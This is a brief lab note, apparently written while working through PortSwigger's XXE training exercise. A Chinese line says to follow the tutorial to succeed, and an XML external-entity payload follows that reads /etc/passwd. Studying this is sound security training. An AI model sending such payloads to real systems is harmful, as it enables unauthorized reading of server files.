https://portswigger.net/web-security/xxe

順著上方教學的步驟做即可攻擊成功

payload:
```
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><data><ID>&xxe;</ID></data>
```
